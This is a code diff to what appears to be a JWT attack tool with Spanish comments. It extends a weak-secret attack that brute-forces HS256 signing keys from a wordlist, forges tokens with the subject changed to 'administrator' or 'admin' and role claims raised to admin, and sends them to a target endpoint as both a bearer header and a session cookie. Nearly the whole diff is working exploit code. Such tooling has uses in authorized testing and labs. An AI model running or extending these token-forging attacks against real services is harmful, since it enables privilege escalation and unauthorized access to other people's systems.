@@ -87,6 +87,7 @@ DEFAULT_WORDLIST = [
     "key",
     "token",
     "secret",
+    "secret1",
     "password",
     "admin",
     "test",
@@ -193,8 +194,14 @@ def set_nested(d, path, value):
 
 
 def http(url, method="GET", headers=None, body=None, timeout=10):
+    headers = dict(headers or {})
+    # ── FIX: si viene Authorization: Bearer <jwt>, enviarlo TAMBIÉN en cookie session ──
+    auth = headers.get("Authorization", "")
+    if auth.startswith("Bearer "):
+        token = auth[len("Bearer "):]
+        headers.setdefault("Cookie", f"session={token}")
     req = urllib.request.Request(url, method=method)
-    for k, v in (headers or {}).items():
+    for k, v in headers.items():
         req.add_header(k, v)
     if body is not None:
         req.data = body.encode() if isinstance(body, str) else body
@@ -352,22 +359,41 @@ def attack_key_confusion(endpoint, decoded, customer_token, base):
 
 def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
     wordlist = wordlist or DEFAULT_WORDLIST
+    base = decoded["payload"].copy()
+
+    # Variante 1: sub -> administrator
+    v_sub_admin = base.copy()
+    if "sub" in v_sub_admin:
+        v_sub_admin["sub"] = "administrator"
+
+    # Variante 2: role/scope -> admin (apps reales con claim de rol)
+    v_role = base.copy()
+    role_path, _ = find_role_path(v_role)
+    if role_path:
+        set_nested(v_role, role_path, "admin")
+
+    # Variante 3: sub -> admin (fallback genérico)
+    v_sub_generic = base.copy()
+    if "sub" in v_sub_generic:
+        v_sub_generic["sub"] = "admin"
+
+    variants = [v_sub_admin, v_role, v_sub_generic]
+
     for guess in wordlist:
-        payload = decoded["payload"].copy()
-        role_path, _ = find_role_path(payload)
-        if role_path:
-            set_nested(payload, role_path, "admin")
-        forged = forge_hs256(payload, guess.encode())
-        r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
-        if r["status"] == 200:
-            validation = validate_attack(endpoint, forged, customer_token)
-            return {
-                "attempted": True,
-                "success": True,
-                "reason": "weak_secret_cracked",
-                "cracked_secret": guess,
-                "validation": validation,
-            }
+        for payload in variants:
+            forged = forge_hs256(payload, guess.encode())
+            r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
+            if r["status"] == 200:
+                validation = validate_attack(endpoint, forged, customer_token)
+                return {
+                    "attempted": True,
+                    "success": True,
+                    "reason": "weak_secret_cracked",
+                    "cracked_secret": guess,
+                    "forged_payload": payload,
+                    "validation": validation,
+                }
+
     return {
         "attempted": True,
         "success": False,
